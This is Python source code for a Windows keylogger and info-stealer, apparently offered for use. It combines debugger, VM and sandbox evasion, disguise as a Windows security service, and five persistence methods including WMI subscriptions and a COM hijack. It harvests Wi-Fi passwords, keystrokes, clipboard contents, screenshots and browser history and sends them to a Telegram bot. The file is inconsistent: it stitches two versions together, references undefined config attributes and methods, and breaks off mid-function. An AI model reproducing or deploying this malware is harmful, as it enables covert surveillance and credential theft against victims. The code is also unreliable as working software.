import os, sys, time, threading, ctypes, subprocess, socket, platform, uuid, json, struct
import winreg, shutil, hashlib, base64, random, string, io, tempfile, ssl
from datetime import datetime, timedelta
from pathlib import Path

# === ANTI-ANALYSIS & EVASION ===
import ctypes.wintypes

def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

def check_remote_debugger():
    isDebugger = ctypes.c_int(0)
    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
        ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(isDebugger))
    return isDebugger.value != 0

def detect_vm():
    vm_indicators = [
        'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels',
        'hyper-v', 'bhyve', 'kvm'
    ]
    try:
        bios = subprocess.check_output(
            'wmic bios get serialnumber,version,manufacturer',
            creationflags=0x08000000, shell=True).decode().lower()
        for ind in vm_indicators:
            if ind in bios:
                return True
    except:
        pass
    try:
        board = subprocess.check_output(
            'wmic baseboard get manufacturer,product',
            creationflags=0x08000000, shell=True).decode().lower()
        for ind in vm_indicators:
            if ind in board:
                return True
    except:
        pass
    # Check low resources (sandboxes often have <2 cores, <2GB RAM)
    try:
        import psutil
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2147483648:
            return True
    except:
        pass
    # Check for analysis tools
    suspicious_procs = [
        'wireshark', 'fiddler', 'procmon', 'procexp', 'ollydbg',
        'x64dbg', 'x32dbg', 'ida', 'ghidra', 'pestudio', 'autoruns',
        'tcpview', 'processhacker', 'dnspy', 'httpdebugger'
    ]
    try:
        tasks = subprocess.check_output('tasklist',
            creationflags=0x08000000, shell=True).decode().lower()
        for proc in suspicious_procs:
            if proc in tasks:
                return True
    except:
        pass
    return False

def detect_sandbox():
    # Check uptime - sandboxes often just booted
    uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
    if uptime < 600:  # less than 10 minutes
        return True
    # Check recent files count
    recent = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Recent')
    try:
        if len(os.listdir(recent)) < 10:
            return True
    except:
        pass
    # Check if less than 40 processes running
    try:
        tasks = subprocess.check_output('tasklist',
            creationflags=0x08000000, shell=True).decode()
        if tasks.count('\n') < 40:
            return True
    except:
        pass
    # Mouse movement check
    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    pt1 = POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))
    time.sleep(2)
    pt2 = POINT()
    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
    if pt1.x == pt2.x and pt1.y == pt2.y:
        # Check once more
        time.sleep(3)
        pt3 = POINT()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(pt3))
        if pt1.x == pt3.x and pt1.y == pt3.y:
            return True
    return False

# === STARTUP GATE ===
def evasion_gate():
    if is_debugger_present() or check_remote_debugger():
        sys.exit(0)
    if detect_vm():
        sys.exit(0)
    if detect_sandbox():
        sys.exit(0)

evasion_gate()

# === DEPENDENCIES (silent install) ===
def silent_install(pkg):
    try:
        subprocess.check_call(
            [sys.executable, '-m', 'pip', 'install', pkg, '-q', '--disable-pip-version-check'],
            creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

required = ['pynput', 'requests', 'pillow', 'psutil', 'cryptography', 'pyperclip', 'browser-history']
for pkg in required:
    try:
        __import__(pkg.replace('-', '_'))
    except ImportError:
        silent_install(pkg)

from pynput import keyboard
from PIL import ImageGrab
import requests
import psutil
import pyperclip
from cryptography.fernet import Fernet

# === CONFIGURATION ===
BOT_TOKEN = 'Your telegram bot API-key will go here'
CHAT_ID = 'your telegram account chat ID go here so you can access bot privately'
TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
EXE_NAME = 'WindowsSecurityHealth.exe'
HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHealth')
BACKUP_FOLDER = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'WindowsApps', '.cache')
SECONDARY_BACKUP = os.path.join(os.environ['TEMP'], '.winsvc')
LOG_FILE = os.path.join(HIDDEN_FOLDER, 'health.dat')
BACKUP_LOG = os.path.join(BACKUP_FOLDER, 'cache.dat')
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)
REPORT_INTERVAL = 45
SCREENSHOT_INTERVAL = 120
CLIPBOARD_INTERVAL = 15
HEARTBEAT_INTERVAL = 1800
PROCESS_MONITOR_INTERVAL = 60
BROWSER_HARVEST_INTERVAL = 3600
WATCHDOG_INTERVAL = 300

# === DIRECTORY SETUP ===
for folder in [HIDDEN_FOLDER, BACKUP_FOLDER, SECONDARY_BACKUP]:
    os.makedirs(folder, exist_ok=True)
    try:
        ctypes.windll.kernel32.SetFileAttributesW(folder, 0x02 | 0x04)  # hidden + system
    except:
        pass

# === HIDE CONSOLE ===
try:
    ctypes.windll.kernel32.SetConsoleTitleW("Service Host: Windows Security")
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
except:
    pass

# === POLYMORPHIC MUTEX (prevent double-run, unique per machine) ===
machine_id = hashlib.md5(uuid.getnode().to_bytes(6, 'big')).hexdigest()[:16]
MUTEX_NAME = f'Global\\WinSvcHealth_{machine_id}'
mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)

# === ENCRYPTED LOCAL STORAGE ===
class SecureStorage:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()

    def append(self, data):
        with self.lock:
            encrypted = cipher.encrypt(data.encode())
            self.buffer.append(encrypted)
            # Triple redundancy write
            for path in [LOG_FILE, BACKUP_LOG, os.path.join(SECONDARY_BACKUP, 'svc.dat')]:
                try:
                    with open(path, 'ab') as f:
                        f.write(encrypted + b'\n')
                except:
                    pass

    def flush(self):
        with self.lock:
            out = []
            for item in self.buffer:
                try:
                    out.append(cipher.decrypt(item).decode())
                except:
                    pass
            self.buffer.clear()
            return '\n'.join(out)

    def flush_from_disk(self):
        """Recovery: read from disk if RAM buffer lost"""
        for path in [LOG_FILE, BACKUP_LOG, os.path.join(SECONDARY_BACKUP, 'svc.dat')]:
            try:
                with open(path, 'rb') as f:
                    lines = f.read().split(b'\n')
                content = []
                for line in lines:
                    if line.strip():
                        try:
                            content.append(cipher.decrypt(line.strip()).decode())
                        except:
                            pass
                if content:
                    return '\n'.join(content)
            except:
                continue
        return ''

storage = SecureStorage()

# === TELEGRAM DELIVERY WITH REDUNDANCY ===
def send_telegram(text, retries=5, parse_mode='HTML'):
    for attempt in range(retries):
        try:
            # Chunk if too long
            chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for chunk in chunks:
                r = requests.post(f'{TELEGRAM_API}/sendMessage', data={
                    'chat_id': CHAT_ID,
                    'text': chunk,
                    'parse_mode': parse_mode,
                    'disable_web_page_preview': True
                }, timeout=30)
                if r.status_code == 200:
                    continue
                else:
                    raise Exception(f'Status {r.status_code}')
            return True
        except:
            wait = (2 ** attempt) + random.uniform(0, 1)
            time.sleep(wait)
    # Failed all retries - store for later
    return False

def send_telegram_file(file_bytes, filename, caption='', retries=5):
    for attempt in range(retries):
        try:
            files = {'document': (filename, file_bytes)}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            r = requests.post(f'{TELEGRAM_API}/sendDocument',
                            data=data, files=files, timeout=60)
            if r.status_code == 200:
                return True
            raise Exception(f'Status {r.status_code}')
        except:
            time.sleep((2 ** attempt) + random.uniform(0, 1))
    return False

def send_telegram_photo(photo_bytes, caption='', retries=5):
    for attempt in range(retries):
        try:
            files = {'photo': ('screen.jpg', photo_bytes, 'image/jpeg')}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            r = requests.post(f'{TELEGRAM_API}/sendPhoto',
                            data=data, files=files, timeout=60)
            if r.status_code == 200:
                return True
            raise Exception(f'Status {r.status_code}')
        except:
            time.sleep((2 ** attempt) + random.uniform(0, 1))
    return False

# === NETWORK CHECKER WITH QUEUE ===
class NetworkQueue:
    def __init__(self):
        self.queue = []
        self.lock = threading.Lock()

    def add(self, func, args):
        with self.lock:
            self.queue.append((func, args))

    def process(self):
        with self.lock:
            remaining = []
            for func, args in self.queue:
                try:
                    if not func(*args):
                        remaining.append((func, args))
                except:
                    remaining.append((func, args))
            self.queue = remaining

net_queue = NetworkQueue()

def is_online():
    try:
        requests.get('https://api.telegram.org', timeout=5)
        return True
    except:
        return False

def network_watchdog():
    while True:
        try:
            if is_online() and net_queue.queue:
                net_queue.process()
        except:
            pass
        time.sleep(30)

threading.Thread(target=network_watchdog, daemon=True).start()

# === PERSISTENCE (5-Layer) ===
def get_exe_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(sys.argv[0])

def persistence_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsSecurityHealth', 0, winreg.REG_SZ, get_exe_path())
        winreg.CloseKey(key)
    except:
        pass

def persistence_startup_vbs():
    try:
        startup = os.path.join(os.environ['APPDATA'],
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs_path = os.path.join(startup, 'WindowsHealth.vbs')
        vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """{get_exe_path()}""", 0, False'
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02)
    except:
        pass

def persistence_scheduled_task():
    try:
        task_name = 'WindowsSecurityHealthMonitor'
        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{get_exe_path()}\"" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True, creationflags=0x08000000,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Also add a periodic task as backup
        cmd2 = f'schtasks /create /tn "MicrosoftHealthCheck" /tr "\"{get_exe_path()}\"" /sc minute /mo 30 /f'
        subprocess.run(cmd2, shell=True, creationflags=0x08000000,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def persistence_wmi_event():
    """WMI event subscription persistence - very stealthy"""
    try:
        ps_cmd = f'''
        $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
            Name = 'WinHealthFilter';
            EventNamespace = 'root\\cimv2';
            QueryLanguage = 'WQL';
            Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
        }}
        $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
            Name = 'WinHealthConsumer';
            CommandLineTemplate = '"{get_exe_path()}"'
        }}
        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
            Filter = $filter;
            Consumer = $consumer
        }}
        '''
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
                      creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def persistence_com_hijack():
    """COM object hijack for persistence"""
    try:
        # Using a rarely-used CLSID
        clsid = '{89820200-ECBD-11CF-8B85-00AA005B4383}'
        key_path = f'Software\\Classes\\CLSID\\{clsid}\\InProcServer32'
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, get_exe_path())
        winreg.SetValueEx(key, 'ThreadingModel', 0, winreg.REG_SZ, 'Both')
        winreg.CloseKey(key)
    except:
        pass

def install_persistence():
    persistence_registry()
    persistence_startup_vbs()
    persistence_scheduled_task()
    persistence_wmi_event()
    persistence_com_hijack()
    # Copy self to hidden folder
    try:
        dest = os.path.join(HIDDEN_FOLDER, EXE_NAME)
        src = get_exe_path()
        if os.path.abspath(src) != os.path.abspath(dest):
            shutil.copy2(src, dest)
            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)
    except:
        pass

install_persistence()

# === PERSISTENCE WATCHDOG ===
def persistence_watchdog():
    """Periodically verify and repair persistence mechanisms"""
    while True:
        try:
            time.sleep(WATCHDOG_INTERVAL)
            # Check registry
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
                winreg.QueryValueEx(key, 'WindowsSecurityHealth')
                winreg.CloseKey(key)
            except:
                persistence_registry()
            # Check startup vbs
            startup = os.path.join(os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if not os.path.exists(os.path.join(startup, 'WindowsHealth.vbs')):
                persistence_startup_vbs()
            # Check scheduled task
            try:
                result = subprocess.check_output(
                    'schtasks /query /tn "WindowsSecurityHealthMonitor"',
                    creationflags=0x08000000, shell=True, stderr=subprocess.DEVNULL)
            except:
                persistence_scheduled_task()
        except:
            pass

threading.Thread(target=persistence_watchdog, daemon=True).start()

# === PROCESS HOLLOWING DISGUISE ===
def disguise_process():
    """Make process appear legitimate in task manager"""
    try:
        # Change process description in memory
        ctypes.windll.kernel32.SetConsoleTitleW("Service Host: Security Health")
    except:
        pass

disguise_process()

# === SYSTEM RECON ===
def get_system_info():
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['username'] = os.getlogin()
        info['os'] = f"{platform.system()} {platform.release()} {platform.version()}"
        info['architecture'] = platform.machine()
        info['processor'] = platform.processor()
        info['mac'] = ':'.join(f'{uuid.getnode():012x}'[i:i+2] for i in range(0, 12, 2))
    except:
        pass
    try:
        info['cpu_cores'] = psutil.cpu_count(logical=True)
        info['ram_total'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
        info['ram_available'] = f"{psutil.virtual_memory().available / (1024**3):.1f} GB"
    except:
        pass
    try:
        disks = []
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks.append(f"{part.device} {usage.total/(1024**3):.0f}GB ({usage.percent}% used)")
            except:
                pass
        info['disks'] = ' | '.join(disks)
    except:
        pass
    # Network
    try:
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
        info['public_ip'] = requests.get('https://api.ipify.org', timeout=10).text
        info['geo'] = requests.get(f'http://ip-api.com/json/{info["public_ip"]}', timeout=10).json()
    except:
        pass
    # WiFi passwords
    try:
        wifi_data = []
        profiles = subprocess.check_output('netsh wlan show profiles',
            creationflags=0x08000000, shell=True).decode()
        for line in profiles.split('\n'):
            if 'All User Profile' in line:
                name = line.split(':')[1].strip()
                try:
                    pwd_info = subprocess.check_output(
                        f'netsh wlan show profile "{name}" key=clear',
                        creationflags=0x08000000, shell=True).decode()
                    for pline in pwd_info.split('\n'):
                        if 'Key Content' in pline:
                            wifi_data.append(f"{name}: {pline.split(':')[1].strip()}")
                except:
                    pass
        info['wifi_passwords'] = wifi_data
    except:
        pass
    # Antivirus
    try:
        av = subprocess.check_output(
            'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname',
            creationflags=0x08000000, shell=True).decode()
        info['antivirus'] = [x.strip() for x in av.split('\n')[1:] if x.strip()]
    except:
        pass
    # Installed software
    try:
        soft = subprocess.check_output(
            'wmic product get name,version',
            creationflags=0x08000000, shell=True).decode()
        info['installed_software'] = [x.strip() for x in soft.split('\n')[1:] if x.strip()][:50]
    except:
        pass
    # Browser saved passwords location hint
    try:
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'],
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        edge_path = os.path.join(os.environ['LOCALAPPDATA'],
            'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        info['browser_dbs'] = {
            'chrome_exists': os.path.exists(chrome_path),
            'edge_exists': os.path.exists(edge_path)
        }
    except:
        pass
    # Battery
    try:
        battery = psutil.sensors_battery()
        if battery:
            info['battery'] = f"{battery.percent}% {'Charging' if battery.power_plugged else 'Discharging'}"
    except:
        pass
    # Startup programs
    try:
        startup_progs = subprocess.check_output(
            'wmic startup get caption,command',
            creationflags=0x08000000, shell=True).decode()
        info['startup_programs'] = [x.strip() for x in startup_progs.split('\n')[1:] if x.strip()]
    except:
        pass
    return info

# === BROWSER DATA HARVESTING ===
def harvest_browser_data():
    """Extract browser history, bookmarks, cookies info"""
    data = {}
    try:
        from browser_history import get_history
        outputs = get_history()
        history = outputs.get()
        # Get last 100 entries
        if hasattr(history, 'histories'):
            data['recent_history'] = [(str(ts), url) for ts, url in history.histories[-100:]]
    except:
        pass
    # Chrome bookmarks
    try:
        bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'],
            'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks')
        if os.path.exists(bookmarks_path):
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data['chrome_bookmarks'] = json.load(f)
    except:
        pass
    return data

# === ACTIVE WINDOW TRACKING ===
def get_active_window():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except:
        return 'Unknown'

# === IDLE TIME CHECK ===
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]

def get_idle_time():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0

# === KEYLOGGER CORE ===
current_window = ''
key_buffer = []
buffer_lock = threading.Lock()
special_keys = {
    'Key.space': ' ', 'Key.enter': '\n[ENTER]\n', 'Key.tab': '[TAB]',
    'Key.backspace': '[BS]', 'Key.caps_lock': '[CAPS]',
    'Key.shift': '', 'Key.shift_r': '', 'Key.ctrl_l': '[CTRL]',
    'Key.ctrl_r': '[CTRL]', 'Key.alt_l': '[ALT]', 'Key.alt_r': '[ALT]',
    'Key.esc': '[ESC]', 'Key.delete': '[DEL]',
    'Key.up': '[UP]', 'Key.down': '[DOWN]', 'Key.left': '[LEFT]', 'Key.right': '[RIGHT]'
}

def on_press(key):
    global current_window
    try:
        window = get_active_window()
        if window != current_window:
            current_window = window
            timestamp = datetime.now().strftime('%H:%M:%S')
            with buffer_lock:
                key_buffer.append(f'\n\n[{timestamp}] 🪟 {window}\n')

        key_str = str(key)
        if hasattr(key, 'char') and key.char:
            with buffer_lock:
                key_buffer.append(key.char)
        elif key_str in special_keys:
            mapped = special_keys[key_str]
            if mapped:
                with buffer_lock:
                    key_buffer.append(mapped)
        else:
            with buffer_lock:
                key_buffer.append(f'[{key_str}]')
    except:
        pass

# === CLIPBOARD MONITOR ===
last_clipboard = ''

def clipboard_monitor():
    global last_clipboard
    while True:
        try:
            current = pyperclip.paste()
            if current and current != last_clipboard:
                last_clipboard = current
                timestamp = datetime.now().strftime('%H:%M:%S')
                storage.append(f'[{timestamp}] 📋 CLIPBOARD: {current[:500]}')
        except:
            pass
        time.sleep(CLIPBOARD_INTERVAL)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SCREENSHOT MODULE (RAM-only, idle-gated, compressed)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ScreenCapture:
    def __init__(self, config, telegram):
        self.config = config
        self.telegram = telegram
        self.interval = config.SCREENSHOT_INTERVAL
        self.quality = config.SCREENSHOT_QUALITY
        self.idle_threshold = config.IDLE_THRESHOLD

    def _get_idle_time(self):
        """Returns idle time in seconds via GetLastInputInfo."""
        import ctypes
        import ctypes.wintypes

        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.wintypes.UINT),
                ('dwTime', ctypes.wintypes.DWORD),
            ]

        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            return millis / 1000.0
        return 0

    def _capture_to_ram(self):
        """Grab screen directly into a BytesIO buffer — never touches disk."""
        from PIL import ImageGrab
        import io

        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=self.quality)
        buf.seek(0)
        return buf

    def run(self):
        while True:
            try:
                idle = self._get_idle_time()
                if idle < self.idle_threshold:
                    buf = self._capture_to_ram()
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    self.telegram.send_photo(
                        buf,
                        filename=f"scr_{timestamp}.jpg",
                        caption=f"📸 {timestamp}"
                    )
                time.sleep(self.interval)
            except Exception:
                time.sleep(self.interval * 2)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLIPBOARD MONITOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ClipboardMonitor:
    def __init__(self, config, telegram, storage):
        self.config = config
        self.telegram = telegram
        self.storage = storage
        self.last_content = ""
        self.buffer = []
        self.buffer_size = 15

    def _get_clipboard(self):
        import ctypes
        CF_UNICODETEXT = 13
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        user32.OpenClipboard(0)
        try:
            if user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                data = user32.GetClipboardData(CF_UNICODETEXT)
                if data:
                    text = ctypes.c_wchar_p(data)
                    return text.value if text.value else ""
        except Exception:
            pass
        finally:
            user32.CloseClipboard()
        return ""

    def run(self):
        while True:
            try:
                content = self._get_clipboard()
                if content and content != self.last_content:
                    self.last_content = content
                    stamp = datetime.now().strftime("%H:%M:%S")
                    entry = f"[{stamp}] {content[:500]}"
                    self.buffer.append(entry)

                    # flush when buffer fills
                    if len(self.buffer) >= self.buffer_size:
                        self._flush()

                time.sleep(2)
            except Exception:
                time.sleep(5)

    def _flush(self):
        if not self.buffer:
            return
        payload = "📋 CLIPBOARD LOG\n" + "\n".join(self.buffer)
        self.telegram.send_message(payload)
        self.storage.write("clipboard_log", payload)
        self.buffer.clear()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYLOGGER (with encrypted triple-redundant local backup)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class KeyLogger:
    def __init__(self, config, telegram, storage):
        self.config = config
        self.telegram = telegram
        self.storage = storage
        self.buffer = []
        self.current_window = ""
        self.flush_interval = config.KEYLOG_FLUSH_INTERVAL
        self.last_flush = time.time()

    def _get_active_window(self):
        import ctypes
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        return "Unknown"

    def _on_key(self, event):
        try:
            window = self._get_active_window()
            if window != self.current_window:
                self.current_window = window
                stamp = datetime.now().strftime("%H:%M:%S")
                self.buffer.append(f"\n\n--- [{stamp}] {window} ---\n")

            key_map = {
                'Key.space': ' ',
                'Key.enter': '\n',
                'Key.tab': '\t',
                'Key.backspace': '⌫',
                'Key.shift': '',
                'Key.shift_r': '',
                'Key.ctrl_l': '',
                'Key.ctrl_r': '',
                'Key.alt_l': '',
                'Key.alt_r': '',
                'Key.caps_lock': '[CAPS]',
            }

            key_str = str(event)
            if key_str in key_map:
                char = key_map[key_str]
            elif hasattr(event, 'char') and event.char:
                char = event.char
            else:
                char = f'[{key_str}]'

            if char:
                self.buffer.append(char)

            # time-based flush
            if time.time() - self.last_flush >= self.flush_interval:
                self._flush()

        except Exception:
            pass

    def _flush(self):
        if not self.buffer:
            return
        payload = "".join(self.buffer)
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"⌨️ KEYLOG [{stamp}]\n{payload}"

        self.telegram.send_message(message)
        self.storage.write("keylog", payload)
        self.buffer.clear()
        self.last_flush = time.time()

    def run(self):
        from pynput.keyboard import Listener
        with Listener(on_press=self._on_key) as listener:
            # periodic flush thread
            def flusher():
                while True:
                    time.sleep(self.flush_interval)
                    self._flush()

            t = threading.Thread(target=flusher, daemon=True)
            t.start()
            listener.join()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ACTIVE WINDOW TRACKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class WindowTracker:
    def __init__(self, config, telegram, storage):
        self.config = config
        self.telegram = telegram
        self.storage = storage
        self.log = []
        self.last_window = ""
        self.flush_count = 20

    def _get_foreground(self):
        import ctypes
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length:
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        return ""

    def run(self):
        while True:
            try:
                window = self._get_foreground()
                if window and window != self.last_window:
                    self.last_window = window
                    stamp = datetime.now().strftime("%H:%M:%S")
                    self.log.append(f"[{stamp}] {window}")

                    if len(self.log) >= self.flush_count:
                        payload = "🪟 WINDOW LOG\n" + "\n".join(self.log)
                        self.telegram.send_message(payload)
                        self.storage.write("window_log", payload)
                        self.log.clear()

                time.sleep(1)
            except Exception:
                time.sleep(3)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BROWSER DATA HARVESTER (History + Bookmarks)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BrowserHarvester:
    def __init__(self, config, telegram, storage):
        self.config = config
        self.telegram = telegram
        self.storage = storage

    def _chrome_history(self):
        import sqlite3, shutil
        db_path = os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "History"
        )
        if not os.path.exists(db_path):
            return []

        tmp = os.path.join(os.environ["TEMP"], f"hist_{random.randint(1000,9999)}.db")
        shutil.copy2(db_path, tmp)
        try:
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT url, title, visit_count, "
                "datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 200"
            )
            rows = cursor.fetchall()
            conn.close()
            return rows
        except Exception:
            return []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass

    def _edge_history(self):
        import sqlite3, shutil
        db_path = os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Microsoft", "Edge", "User Data", "Default", "History"
        )
        if not os.path.exists(db_path):
            return []

        tmp = os.path.join(os.environ["TEMP"], f"ehist_{random.randint(1000,9999)}.db")
        shutil.copy2(db_path, tmp)
        try:
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT url, title, visit_count, "
                "datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 200"
            )
            rows = cursor.fetchall()
            conn.close()
            return rows
        except Exception:
            return []
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass

    def _chrome_bookmarks(self):
        import json
        bk_path = os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "Bookmarks"
        )
        if not os.path.exists(bk_path):
            return []
        try:
            with open(bk_path, 'r', encoding='utf-8') as f:
                data = json.load(f)

            bookmarks = []
            def parse_node(node):
                if node.get("type") == "url":
                    bookmarks.append((node.get("name", ""), node.get("url", "")))
                for child in node.get("children", []):
                    parse_node(child)

            for root_key in data.get("roots", {}):
                root = data["roots"][root_key]
                if isinstance(root, dict):
                    parse_node(root)
            return bookmarks
        except Exception:
            return []

    def harvest(self):
        results = []

        chrome_hist = self._chrome_history()
        if chrome_hist:
            lines = [f"  {r[3]} | {r[1][:60]} | {r[0][:120]}" for r in chrome_hist[:100]]
            results.append("🌐 CHROME HISTORY (last 100):\n" + "\n".join(lines))

        edge_hist = self._edge_history()
        if edge_hist:
            lines = [f"  {r[3]} | {r[1][:60]} | {r[0][:120]}" for r in edge_hist[:100]]
            results.append("🌐 EDGE HISTORY (last 100):\n" + "\n".join(lines))

        chrome_bk = self._chrome_bookmarks()
        if chrome_bk:
            lines = [f"  {b[0][:60]} → {b[1][:120]}" for b in chrome_bk[:80]]
            results.append("🔖 CHROME BOOKMARKS:\n" + "\n".join(lines))

        for chunk in results:
            # split into 4000-char segments for Telegram
            for i in range(0, len(chunk), 4000):
                self.telegram.send_message(chunk[i:i+4000])
                time.sleep(1)

        if results:
            self.storage.write("browser_data", "\n\n".join(results))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PERSISTENCE WATCHDOG (self-healing daemon)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class PersistenceWatchdog:
    def __init__(self, persistence, config):
        self.persistence = persistence
        self.check_interval = config.WATCHDOG_INTERVAL

    def run(self):
        """Periodically re-checks and re-installs any persistence layers that got removed."""
        while True:
            try:
                self.persistence.install_all()
                time.sleep(self.check_interval)
            except Exception:
